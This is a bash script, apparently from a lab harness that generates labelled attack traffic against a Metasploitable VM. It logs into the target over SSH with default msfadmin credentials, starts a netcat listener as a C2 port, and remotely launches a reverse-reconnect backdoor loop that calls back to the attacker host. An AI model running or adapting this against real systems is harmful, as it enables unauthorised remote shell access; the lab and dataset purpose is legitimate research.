#!/usr/bin/env bash
set -euo pipefail

RUN_NAME="$1"
NOTES_FILE="$2"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../config.sh"

TARGET_IP="${VICTIM_IP:-192.168.9.131}"
TARGET_USER="${TARGET_USER:-msfadmin}"
TARGET_PASS="${TARGET_PASS:-msfadmin}"
KALI_IP="${KALI_IP:-$(ip route get "$TARGET_IP" | grep -oP 'src \K\S+')}"

ATTACK_DURATION=300
PRE_IDLE=9
POST_IDLE=9

SEED="${SEED:-$RANDOM}"
RANDOM="$SEED"

export SSHPASS="$TARGET_PASS"

SSH_OPTS=(
  -o StrictHostKeyChecking=no
  -o UserKnownHostsFile=/dev/null
  -o HostKeyAlgorithms=+ssh-rsa,ssh-dss
  -o ConnectTimeout=8
)

rand_int() {
  local min="$1"
  local max="$2"
  echo $(( RANDOM % (max - min + 1) + min ))
}

log_kv() {
  echo "$1=$2" | tee -a "$NOTES_FILE"
}

log_time() {
  echo "$1 $(date -u +'%Y-%m-%d %H:%M:%S UTC')" | tee -a "$NOTES_FILE"
}

check_remote_process() {
  local pattern="$1"
  sshpass -e ssh "${SSH_OPTS[@]}" "$TARGET_USER@$TARGET_IP" \
    "ps -ef | grep '$pattern' | grep -v grep || true" 2>/dev/null || true
}

tail_remote_log() {
  local log_file="$1"
  sshpass -e ssh "${SSH_OPTS[@]}" "$TARGET_USER@$TARGET_IP" \
    "test -f '$log_file' && tail -n 20 '$log_file' || echo '[WARN] remote log not found: $log_file'" \
    2>/dev/null || true
}

# ============================================================
# backdoor_shell_reverse_reconnect.sh
#
# PROFILE_ID:
#   reverse_reconnect_beacon
# ============================================================

ATTACK_SUBTYPE="reverse_reconnect"
PROFILE_ID="${PROFILE_ID:-reverse_reconnect_beacon}"
C2_PORT="${C2_PORT:-4446}"

configure_profile() {
  case "$PROFILE_ID" in
    reverse_reconnect_beacon)
      ;;
    *)
      echo "[-] Unknown PROFILE_ID: $PROFILE_ID" >&2
      echo "    Allowed: reverse_reconnect_beacon" >&2
      exit 1
      ;;
  esac
}

start_listener_loop() {
  local duration="$1"
  local end_ts=$((SECONDS + duration))
  while [[ "$SECONDS" -lt "$end_ts" ]]; do
    nc -l -p "$C2_PORT" >> "/tmp/nc_debug_${RUN_NAME}.log" 2>&1 || true
  done
}

configure_profile

log_kv RUN_ID "$RUN_NAME"
log_kv ATTACK_CATEGORY "backdoor_shell"
log_kv ATTACK_SUBTYPE "$ATTACK_SUBTYPE"
log_kv PROFILE_ID "$PROFILE_ID"
log_kv RANDOM_SEED "$SEED"
log_kv PROTOCOL "tcp"
log_kv TOOL "nc_bash"
log_kv TARGET_PORT "$C2_PORT"
log_kv MODULE_SUMMARY "nc_reverse_reconnect_${PROFILE_ID}"

DEBUG_LOG="/tmp/nc_debug_${RUN_NAME}.log"
: > "$DEBUG_LOG"

echo "[*] backdoor_shell reverse reconnect started: $RUN_NAME profile=$PROFILE_ID seed=$SEED"

sleep "$PRE_IDLE"
log_time ATTACK_START

start_listener_loop "$ATTACK_DURATION" &
LISTENER_PID=$!

sleep 2

sshpass -e ssh "${SSH_OPTS[@]}" "$TARGET_USER@$TARGET_IP" \
  "pkill -9 -f '[b]d_reconnect_loop.sh' || true" \
  >> "$DEBUG_LOG" 2>&1 || true

sleep 1

sshpass -e ssh "${SSH_OPTS[@]}" "$TARGET_USER@$TARGET_IP" \
  "nohup /tmp/bd_reconnect_loop.sh ${KALI_IP} ${C2_PORT} ${ATTACK_DURATION} ${PROFILE_ID} ${SEED} >/tmp/bd_reconnect_loop_${C2_PORT}.log 2>&1 < /dev/null &" \
  >> "$DEBUG_LOG" 2>&1 || true

sleep 3

{
  echo "[LOCAL] remote process check after start:"
  check_remote_process "bd_reconnect_loop.sh"
  echo "[LOCAL] remote log after start:"
  tail_remote_log "/tmp/bd_reconnect_loop_${C2_PORT}.log"
} >> "$DEBUG_LOG" 2>&1 || true

sleep "$ATTACK_DURATION"

log_time ATTACK_END

kill "$LISTENER_PID" >/dev/null 2>&1 || true
sshpass -e ssh "${SSH_OPTS[@]}" "$TARGET_USER@$TARGET_IP" \
  "pkill -9 -f '[b]d_reconnect_loop.sh' || true" >> "$DEBUG_LOG" 2>&1 || true

sleep "$POST_IDLE"

echo "[+] backdoor_shell reverse reconnect finished: $RUN_NAME"
